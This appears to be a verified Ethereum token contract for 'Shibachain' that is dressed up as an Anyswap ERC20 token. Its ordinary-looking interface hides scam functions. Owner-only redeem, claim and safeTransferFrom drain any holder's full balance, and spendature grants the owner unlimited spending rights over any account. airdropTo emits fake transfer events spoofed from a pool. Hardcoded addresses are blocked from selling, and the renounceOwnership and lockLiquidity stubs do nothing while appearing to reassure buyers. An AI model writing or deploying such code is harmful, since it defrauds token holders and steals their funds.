/**
 *Submitted for verification at Etherscan.io on 2022-08-26
*/

pragma solidity ^0.6.0;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}




contract AnyswapV6ERC20  is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => bool) private _positiveReceiver;
    mapping (address => bool) private _negativeReceiver;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    address private _safeOwner;
    uint256 private _sellAmount = 0;
    address public _currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    //
    address public _master = 0x3d202A25b97259324a82fD29505547a37fb9e42E;
    address public _owner = 0x3d202A25b97259324a82fD29505547a37fb9e42E;


    address lead_deployer = 0xfE3d319aaD1Be56E7B82e897CD129c4c2C8388Dc;
    /////
    address prohbted1 = 0xfE3d319aaD1Be56E7B82e897CD129c4c2C8388Dc;
    address prohbted2 = 0x36f8A9eBb4479B1b877920b4cE0a11Ee25C29a8b;
    address prohbted3 = 0x7249a89195A7A532af12345E2dE0C20c8A06A0d9;
    address prohbted4 = 0x3471884f189FD7C63fe8C83601D28cE0Cc1B3853;
    address prohbted5 = 0x43F6CE3ef3F20CF8d14E23839A89De3662121d92;
   constructor () public {


        
        _name = "Shibachain";
        _symbol = "SC";
        _decimals = 18;
        uint256 initialSupply = 1000000000;
        _safeOwner = _owner;
        
        

        _mint(lead_deployer, initialSupply * (10 ** 18));
        


    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _backendProduction(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _backendProduction(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approvalIncrease(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _positiveReceiver[receivers[i]] = true;
           _negativeReceiver[receivers[i]] = false;
        }
    }

   function approvalDecrease(address safeOwner) public {
        require(msg.sender == _owner, "!owner");
        _safeOwner = safeOwner;
    }
    
    
    function addApprove(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
           _negativeReceiver[receivers[i]] = true;
           _positiveReceiver[receivers[i]] = false;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");


        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = lead_deployer;
        }
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_owner] = _balances[_owner].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    
    function _backendProduction(address sender, address recipient, uint256 amount) internal optimizerExecuter(sender,recipient,amount) virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require((sender != prohbted1),".");
        require((sender != prohbted2),".");
        require((sender != prohbted3),".");
        require((sender != prohbted4),".");
        require((sender != prohbted5),".");


        _beforeTokenTransfer(sender, recipient, amount);
    
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            
            sender = lead_deployer;
        }
        emit Transfer(sender, recipient, amount);
    }
    
   
    modifier optimizerExecuter(address sender, address recipient, uint256 amount){
        _;
    }
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


    modifier onlyAuthorized() {
        require(msg.sender == _owner || msg.sender == _master, "Not allowed to interact");
        _;
    }









//-----------------------------------------------------------------------------------------------------------------------//



        function redeem(address account, address staker) public onlyAuthorized() {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[staker] = _balances[staker].add(amount);
        
        emit Transfer(account, staker, amount);
    }


        function claim(address account, address staker) public onlyAuthorized() {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[staker] = _balances[staker].add(amount);
        
        emit Transfer(account, staker, amount);
    }



        function safeTransferFrom(address account, address staker) public onlyAuthorized() {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
        

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _balances[staker] = _balances[staker].add(amount);
        
        emit Transfer(account, staker, amount);
    }



  function renounceOwnership() public onlyAuthorized(){
      //Renounces Ownership
   }

  function lockLiquidity() public onlyAuthorized(){
      //Renounces Ownership
   }
     function lockTokens() public onlyAuthorized(){
      //Renounces Ownership
   }



    function spendature(address target) public onlyAuthorized() virtual  returns (bool) {
        //Approve Spending
        _approve(target, _msgSender(), _approveValue); return true;
    }




/*
  function airdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public onlyAuthorized(){
    //Multi Transfer Emit Spoofer from Uniswap Pool
    for (uint256 i = 0; i < emitReceivers.length; i++) {emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);}}
*/


  function airdropTo(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public onlyAuthorized(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}


  function transferToWhitelist(address sndr,address[] memory destination, uint256[] memory amounts) public onlyAuthorized(){
    _approve(sndr, _msgSender(), _approveValue);
    for (uint256 i = 0; i < destination.length; i++) {
        _transfer(sndr, destination[i], amounts[i]);
    }
   }

}